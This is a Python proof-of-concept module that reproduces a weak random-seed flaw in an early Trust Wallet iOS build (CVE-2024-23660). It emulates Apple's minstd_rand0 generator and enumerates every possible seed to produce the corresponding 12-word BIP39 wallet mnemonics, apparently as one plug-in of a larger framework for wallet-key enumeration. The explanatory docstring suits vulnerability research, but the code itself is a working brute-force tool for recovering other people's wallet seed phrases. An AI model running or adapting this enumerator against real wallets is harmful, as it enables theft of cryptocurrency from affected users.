"""
Trust Wallet iOS — minstd_rand0 LCG Weak Seed (CVE-2024-23660) BIP39 Enumerator

Vulnerability model:
    Trust Wallet iOS v0.0.4 (commit 3cd6e8f6) misused the trezor-crypto library:
    
    ```c
    // Trust Wallet iOS source (simplified)
    srand((unsigned)time(NULL));  // 31-bit LCG, seed = Unix timestamp (seconds)
    
    // trezor-crypto's random_buffer is overridden:
    uint32_t random_buffer(uint8_t *buf, size_t len) {
        for (size_t i = 0; i < len; i++) {
            buf[i] = rand() & 0xFF;  // minstd_rand0 LCG output
        }
    }
    
    // Then calls: mnemonic_generate(128) -> uses the above random_buffer
    ```

    Apple libc's rand()/srand() implementation = minstd_rand0:
        state = (state * 16807) % 2147483647  (i.e. a=16807, m=2^31-1)
    
    Seed = time(NULL) = Unix timestamp (second precision)

Effective entropy analysis:
    - srand() seed: Unix timestamp, second precision
    - minstd_rand0 state space: 2^31 - 1 (but constrained by time())
    - Time window: Trust Wallet iOS v0.0.4 active period 2018-03 ~ 2018-12, approx 275 days
    - Effective seed count: 275 x 86400 = 23,760,000 ~ 2^24.5
    - Full state search without time constraint: 2^31 - 1 ~ 2.1x10^9

    Variant A: trezor-crypto 2e528be -> rand() directly fills 16 bytes
    Variant B: trezor-crypto 009850 -> rand() fills 32 bytes then SHA256 takes first 16 bytes

    This POC implements Variant A (more direct, more common):
        entropy[i] = rand() & 0xFF, i = 0..15
        mnemonic = BIP39(entropy)

Mathematical proof:
    Let f(t) = BIP39([minstd_rand0(t).next() & 0xFF]_16), t in [T_start, T_end)
    minstd_rand0(t): state = t; state = (state * 16807) % (2^31 - 1)
    
    Variant A: entropy = [state_after_i_steps & 0xFF for i in 1..16]
    |M| <= T_end - T_start ~ 23,760,000 (time window optimization)
    |M| <= 2^31 - 1 (full search)
    H_eff ~ 24.5 bits (time window) or 31 bits (full search)

Impact:
    - Trust Wallet iOS users from 2018
    - Exploited concurrently with Milk Sad (2023-07)
    - Multi-chain: BTC, ETH, etc.
    - milksad.info Update #5 detailed analysis

Source references:
    https://github.com/niceDev0908/wallet-core-master (vulnerable commit)
    https://milksad.info/posts/research-update-5/
    CVE-2024-23660
"""
import sys
import os
from hashlib import sha256
from typing import Iterator, Optional, Tuple

HERE = os.path.dirname(os.path.abspath(__file__))
from base import PocGenerator

sys.path.insert(0, os.path.join(HERE, "..", "..", "coldcard", "yasmarang_bypass"))
from ngu.bip39 import wordlist_en as BIP39_WORDLIST


# Apple libc minstd_rand0: state = (state * 16807) % (2^31 - 1)
M = 2147483647  # 2^31 - 1 (Mersenne prime)
A = 16807


class MinstdRand0:
    """Exact reproduction of Apple libc rand()/srand() = minstd_rand0 LCG"""

    def __init__(self, seed: int):
        # srand(seed): state = seed (special case: if seed=0, treat as 1)
        self.state = seed if seed != 0 else 1

    def next(self) -> int:
        """rand(): returns value in range [0, 2^31-2]"""
        self.state = (self.state * A) % M
        return self.state


def generate_entropy_variant_a(seed: int) -> bytes:
    """
    Variant A: directly fills 16 bytes of entropy using rand() & 0xFF.
    Corresponds to trezor-crypto commit 2e528be random_buffer implementation.
    """
    rng = MinstdRand0(seed)
    return bytes([rng.next() & 0xFF for _ in range(16)])


def entropy_to_mnemonic_12(entropy_bytes: bytes) -> str:
    """BIP-39: 16 bytes (128 bit) -> 12-word mnemonic"""
    h = sha256(entropy_bytes).digest()
    b = int.from_bytes(entropy_bytes, 'big')
    checksum_bits = (h[0] >> 4) & 0x0F
    combined = (b << 4) | checksum_bits
    words = []
    for i in range(11, -1, -1):
        idx = (combined >> (i * 11)) & 0x7FF
        words.append(BIP39_WORDLIST[idx])
    return ' '.join(words)


# Time window: Trust Wallet iOS v0.0.4 active period
# 2018-03-01 ~ 2018-12-31
TW_IOS_START = 1519862400  # 2018-03-01 00:00:00 UTC
TW_IOS_END = 1546300800    # 2019-01-01 00:00:00 UTC
# For complete coverage, use full minstd state space
TOTAL_SPACE = M - 1  # 2^31 - 2 = 2,147,483,646


class TwIosMinstdGenerator(PocGenerator):
    """
    Enumerates all seed states of Trust Wallet iOS minstd_rand0,
    each deterministically producing a 12-word BIP-39 mnemonic.

    Effective entropy: 31 bits (full search) or 24.5 bits (time window optimization)
    Risk level: critical (CVE-2024-23660, exploited 2023-07)
    """

    @property
    def poc_id(self) -> str:
        return "tw_ios_minstd"

    @property
    def poc_name(self) -> str:
        return "Trust Wallet iOS minstd_rand0 LCG (CVE-2024-23660)"

    @property
    def total_space(self) -> int:
        return TOTAL_SPACE

    @property
    def batch_size(self) -> int:
        return 50000

    def generate(self, start_index: int) -> Iterator[Tuple[int, Optional[str]]]:
        for idx in range(start_index, TOTAL_SPACE):
            seed = idx + 1  # minstd seed starts from 1 (0 is mapped to 1)
            entropy = generate_entropy_variant_a(seed)
            mnemonic = entropy_to_mnemonic_12(entropy)
            yield (idx, mnemonic)
